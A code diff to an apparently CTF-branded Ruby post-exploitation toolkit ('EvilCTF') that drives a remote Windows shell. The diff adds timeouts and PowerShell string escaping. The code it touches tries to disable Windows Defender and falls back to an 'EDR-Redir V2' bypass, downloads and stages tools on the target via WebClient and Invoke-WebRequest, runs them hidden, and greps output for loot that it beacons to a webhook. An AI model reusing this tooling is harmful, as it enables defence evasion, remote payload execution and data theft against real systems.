@@ -1,7 +1,9 @@
 #!/usr/bin/env ruby
 # frozen_string_literal: true
-# Compatibility shim – define Fixnum for Ruby\u20093.x
-class Fixnum < Integer; end unless defined?(Fixnum)
+# Compatibility shim – define Fixnum for very old Rubies (pre-2.4)
+if RUBY_VERSION.to_f < 2.4
+  class Fixnum < Integer; end unless defined?(Fixnum)
+end
 require 'fileutils'
 require 'zip'
 require 'uri'
@@ -307,11 +309,11 @@ module EvilCTF::Tools
     }
   PS
 
-  result = shell.run(ps_cmd)
-  puts result.output
+  exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 60)
+  puts exec_res.output
 
   # Final check: is Defender still enabled?
-  final_status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
+  final_status = EvilCTF::Execution.run(shell, 'Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled', timeout: 10)
   if final_status.output.strip == 'True'
     puts "[!] WARNING: Defender is still enabled after attempted disable."
     puts "[*] Attempting EDR-Redir V2 bypass..."
@@ -331,7 +333,7 @@ module EvilCTF::Tools
     ps_cmd = <<~PS
       try {
         New-Item -ItemType Directory -Path "C:\\TMP\\TEMPDIR" -Force | Out-Null
-        $result = Start-Process -FilePath "#{remote_edr_redir}" -ArgumentList "C:\\ProgramData\\Microsoft C:\\TMP\\TEMPDIR \"C:\\ProgramData\\Microsoft\\Windows Defender\"" -PassThru -Wait
+        $result = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_edr_redir)}' -ArgumentList "C:\\ProgramData\\Microsoft C:\\TMP\\TEMPDIR \"C:\\ProgramData\\Microsoft\\Windows Defender\"" -PassThru -Wait
         if ($result.ExitCode -eq 0) {
           Write-Output "[+] EDR-Redir V2 executed successfully"
         } else {
@@ -407,9 +409,9 @@ end
       puts "[*] Expanding macro: #{name}"
       macro.each do |step|
         begin
-          result = shell.run(step)
-          puts result.output.strip
-          matches = EvilCTF::Tools.grep_output(result.output)
+          exec_res = EvilCTF::Execution.run(shell, step, timeout: 120)
+          puts exec_res.output.to_s.strip
+          matches = EvilCTF::Tools.grep_output(exec_res.output)
           if matches.any?
             EvilCTF::Tools.save_loot(matches)
             EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
@@ -439,7 +441,7 @@ end
         puts "[*] Attempting remote download on target for #{key}..."
         ps_cmd = <<~PS
           try {
-            (New-Object System.Net.WebClient).DownloadFile('#{tool[:download_url]}', '#{tool[:recommended_remote]}')
+            (New-Object System.Net.WebClient).DownloadFile('#{EvilCTF::Utils.escape_ps_string(tool[:download_url])}', '#{EvilCTF::Utils.escape_ps_string(tool[:recommended_remote])}')
             "SUCCESS"
           } catch {
             "ERROR: $($_.Exception.Message)"
@@ -505,7 +507,7 @@ end
     return success if success
     # Try PowerShell as last resort
     puts "[*] Trying PowerShell Invoke-WebRequest..."
-    ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{url}' -OutFile '#{path}' -UseBasicParsing } catch { exit 1 }\""
+    ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{EvilCTF::Utils.escape_ps_string(url)}' -OutFile '#{EvilCTF::Utils.escape_ps_string(path)}' -UseBasicParsing } catch { exit 1 }\""
     success = system(ps_cmd)
     success
   end
@@ -579,7 +581,7 @@ end
       if extracted_file
         remote_path = File.join(File.dirname(tool[:recommended_remote]), extracted_file)
         
-        check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
+        check_cmd = "if (Test-Path '#{EvilCTF::Utils.escape_ps_string(remote_path)}') { 'EXISTS' } else { 'MISSING' }"
         result = shell.run(check_cmd)
         if result.output.include?('EXISTS')
           puts "[+] #{tool[:name]} already staged at #{remote_path}"
@@ -676,7 +678,7 @@ end
       puts "[*] Executing #{key} with args: #{args}"
       ps_cmd = <<~PS
         try {
-          $proc = Start-Process -FilePath "#{remote_path}" -ArgumentList "#{args}" -PassThru -WindowStyle Hidden
+          $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -ArgumentList '#{EvilCTF::Utils.escape_ps_string(args)}' -PassThru -WindowStyle Hidden
           $proc.WaitForExit(60000) | Out-Null
           if ($proc.HasExited) {
             "Completed with exit code: $($proc.ExitCode)"
